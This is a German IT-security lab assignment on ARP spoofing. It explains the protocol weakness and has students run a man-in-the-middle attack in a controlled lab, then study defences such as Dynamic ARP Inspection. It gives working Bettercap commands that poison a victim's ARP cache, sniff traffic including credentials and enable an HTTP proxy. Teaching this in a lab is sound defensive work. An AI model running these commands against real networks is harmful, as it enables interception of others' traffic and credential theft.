    ARP‑Spoofing – Konzept, Beobachtung und Sicherheitsbewertung

    Einführung

    Lokale Netzwerke basieren auf verschiedenen Protokollen, die die Kommunikation zwischen Geräten ermöglichen. Eines dieser Protokolle ist das Address Resolution Protocol (ARP), das die Zuordnung von IP-Adressen zu den entsprechenden MAC-Adressen übernimmt. Dadurch können Geräte innerhalb eines Netzwerks miteinander kommunizieren. Da ARP jedoch keine Mechanismen zur Überprüfung der Echtheit von Informationen besitzt, kann es durch gefälschte ARP-Nachrichten manipuliert werden.

    Ein bekanntes Angriffsszenario ist das ARP-Spoofing beziehungsweise ARP-Poisoning. Dabei täuscht ein Angreifer anderen Geräten im Netzwerk eine falsche Zuordnung von IP- und MAC-Adressen vor. Dadurch kann der Datenverkehr über das System des Angreifers umgeleitet werden, ohne dass die betroffenen Benutzer den Eingriff bemerken. Auf diese Weise entsteht häufig ein sogenannter Man-in-the-Middle-Angriff (MITM), bei dem Daten mitgelesen, verändert oder weitergeleitet werden können.

    In dieser Übung wird untersucht, wie ARP funktioniert, warum ARP-Spoofing technisch möglich ist und welche Auswirkungen eine Manipulation der ARP-Tabelle auf die Kommunikation in einem lokalen Netzwerk hat. Mithilfe von Netzwerkanalysewerkzeugen werden Veränderungen im Datenverkehr beobachtet und dokumentiert. Abschließend werden die Sicherheitsrisiken bewertet und mögliche Schutzmaßnahmen für moderne Netzwerke betrachtet, um die Bedeutung sicherer Netzwerkprotokolle besser zu verstehen.

    Ziele

    • verstehen, warum ARP Spoofing technisch möglich ist
    • erkennen, wie ein Man‑in‑the‑Middle entsteht
    • beobachten, wie Datenverkehr umgeleitet wird
    • beurteilen, warum ARP ein Sicherheitsproblem darstellt
    • geeignete Schutzmaßnahmen erklären können

    Kompetenzzuordnung

    Grundlagen der IT Sicherheit

    Netzwerksicherheit

    • einfache Angriffsvektoren in Netzwerken erkennen
    • auf Netzwerkgeräte zielende Angriffe abwehren

    Detaillierte Aufgabenbeschreibung

    Aufgabe Grundkompetenz:

    ❗ Die Übung ist als geführte Demonstration oder kontrollierte Laborübung gedacht – nicht zur Anwendung in realen Netzwerken.

    Rechtliche Aspekte: MITM-Angriffe ohne ausdrückliche Erlaubnis sind illegal und strafbar. Verwende Bettercap nur in deiner Lab-Umgebung, bei Penetrationstests mit schriftlicher Genehmigung oder zu Lernzwecken.

    Versuchsaufbau (Konzeptuell)

    Rolle Beschreibung
    Client Normale Netzwerknutzung
    Gateway Router oder Server
    Analyse‑PC Führt ARP‑Manipulation durch

    Alle Geräte befinden sich im gleichen Subnetz.

    IP-Forwarding muss am Gateway und Analyse-PC aktiviert sein, damit der Traffic weitergeleitet wird:

    echo 1 > /proc/sys/net/ipv4/ip_forward

    Teil 1 - Normalzustand

    • ARP‑Tabelle des Clients betrachten
    • Kommunikationsweg Client → Gateway beschreiben
    • Erklären, wer welche MAC‑Adresse kennt

    Teil 2 - ARP‑Manipulation

    Grundlegender Ablauf für einen MITM-Angriff mit ARP Spoofing

    1. Bettercap starten
    sudo bettercap -iface eth0    # oder wlan0 bei WiFi

    (Ersetze eth0 durch dein Interface – mit ifconfig oder ip a herausfinden.)

    1. Netzwerk entdecken (Hosts finden) Im Bettercap-Prompt (>):
    net.probe on          # Aktives Scannen der Geräte
net.recon on          # Passive Erkennung

    Danach siehst du mit net.show eine Liste aller Geräte im Netzwerk (IP + MAC).

    1. ARP Spoofing aktivieren (der eigentliche MITM)
    set arp.spoof.targets 192.168.1.50     # IP des Opfers (einzeln oder mehrere, kommagetrennt)
set arp.spoof.fullduplex true          # Wichtig! Spooft in beide Richtungen (Opfer ↔ Gateway)
arp.spoof on
    • fullduplex true → Der Traffic vom Opfer zum Internet und zurück wird umgeleitet.

    • Optional: set arp.spoof.internal true (nur internes Netzwerk).

    • Traffic sniffen (mitlesen)

    net.sniff on

    Bettercap zeigt nun in Echtzeit viele Pakete an (HTTP-Requests, Credentials usw.). Für detailliertere Analyse kannst du zusätzlich Wireshark starten.

    1. Angriff beenden
    arp.spoof off
net.sniff off

    Komplettes Einzeiler-Setup beim Start

    sudo bettercap -iface eth0 -eval "
net.probe on; 
set arp.spoof.targets 192.168.1.50;
set arp.spoof.fullduplex true;
arp.spoof on;
net.sniff on;
http.proxy on
"

    Beobachtungsschwerpunkte:

    • ARP‑Tabelle des Clients ändert sich
    • Gateway‑IP verweist plötzlich auf falsche MAC
    • Kommunikation funktioniert scheinbar normal

    Diskussion:

    • Warum merkt der Client nichts?
    • Welche OSI‑Schichten sind betroffen?
    • Warum ist das besonders gefährlich?

    Teil 3 - Datenverkehr sichtbar machen

    Analysiere den Netzwerkverkehr während des Angriffs und im Normalzustand und vergleiche die Unterschiede.

    1. Wireshark starten auf dem Client und Analyse-PC

      • Wähle das richtige Netzwerkinterface (z. B. eth0 oder wlan0)
      • Starte die Aufzeichnung

    2. Führe eine einfache Aktion am Client durch (z. B. eine Website aufrufen). Filtere den Verkehr, z. B. mit:

    arp || http || dns

    Dokumentiere deine Beobachtungen mit mindestens einem Screenshot aus Wireshark

    Markiere relevante Stellen (z. B. verdächtige ARP‑Antworten oder auffällige MAC-Zuordnungen)

    Teil 5 – DHCP Snooping & Dynamic ARP Inspection

    Moderne Switches bieten Sicherheitsfunktionen, die gezielt gegen Angriffe wie ARP‑Spoofing und Rogue‑DHCP‑Server eingesetzt werden können.

    Erarbeite dir eigenständig die Funktionsweise der beiden Technologien. Stelle den Bezug zu deinem durchgeführten Angriff her.

    Beurteile die Schutzmechanismen kritisch. Erkläre jeweils Vorteile, Nachteile und Einsatzbereiche.

    Erstelle ein Architekturdiagramm das die notwendigen Komponenten und den Einsatz der Verfahren visulaisiert.

    Recherche oder dokumentiere exemplarisch eine Switch Konfiguration.

    Fragestellungen

    • Warum ist ARP‑Spoofing in einem lokalen Netzwerk technisch möglich?
    • Warum funktioniert ARP‑Spoofing nicht über Router hinweg (also nicht im Internet)?
    • Woran lässt sich in der ARP‑Tabelle eines Clients eine Manipulation erkennen?
    • Welche realen Angriffe nutzen dieses Prinzip?
    • "ARP‑Spoofing ist kein „Hack‑Trick“, sondern ein Protokollproblem" - Warum wurde ARP so entworfen?
    • Welche weiteren Protokolle sind besonders anfällig für MITM‑Angriffe und warum?
    • Warum stellt fehlende Verschlüsselung ein zusätzliches Risiko bei ARP‑Spoofing dar?
